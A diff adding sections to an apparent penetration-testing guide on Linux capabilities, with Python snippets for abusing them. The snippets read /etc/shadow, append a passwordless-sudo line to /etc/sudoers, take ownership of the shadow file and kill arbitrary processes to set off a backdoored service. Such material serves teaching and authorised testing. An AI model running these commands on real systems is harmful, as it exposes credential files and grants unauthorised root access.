@@ -727,6 +727,23 @@ cd /tmp
 tar -cxf shadow.tar.gz
 ```
 
+#### Example with binary2
+
+In this case lets suppose that **`python`** binary has this capability. In order to list root files you could do:
+
+```python
+import os
+for r, d, f in os.walk('/root'):
+    for filename in f:
+        print(filename)
+```
+
+And in order to read a file you could do:
+
+```python
+print(open("/etc/shadow", "r").read())
+```
+
 #### Example with ****Environment \(Docker breakout\)
 
 You can check the enabled capabilities inside the docker container using:
@@ -919,6 +936,16 @@ getcap -r / 2>/dev/null
 vim /etc/sudoers #To overwrite it
 ```
 
+#### Example with binary 2
+
+In this example **`python`** binary will have this capability. You could use python to override any file:
+
+```python
+file=open("/etc/sudoers","a")
+file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
+file.close()
+```
+
 #### Example with environment + CAP\_DAC\_READ\_SEARCH \(Docker breakout\)
 
 You can check the enabled capabilities inside the docker container using:
@@ -1094,6 +1121,34 @@ getcap -r / 2>/dev/null
 ```
 
 Note that if the **environment** is giving this capability you could also use **`tcpdump`** to sniff traffic.
+
+### CAP\_CHOWN
+
+**This means that it's possible to change the ownership of any file.**
+
+#### Example with binary
+
+Lets suppose the **`python`** binary has this capability, you can **change** the **owner** of the **shadow** file, **change roots password**, and escalate privileges:
+
+```bash
+python -c 'import os;os.chown("/etc/shadow",1000,1000)'
+```
+
+### CAP\_KILL
+
+**This means that it's possible to kill any process.** You cannot escalate privileges directly with this capability.
+
+#### Example with binary
+
+Lets suppose the **`python`** binary has this capability. If you could **also modify some service or socket configuration** \(or any configuration file related to a service\) file, you could backdoor it, and then kill the process related to that service and wait for the new configuration file to be executed with your backdoor.
+
+```python
+#Use this python code to kill arbitrary processes
+import os
+import signal
+pgid = os.getpgid(341)
+os.killpg(pgid, signal.SIGKILL)
+```
 
 ## References
 
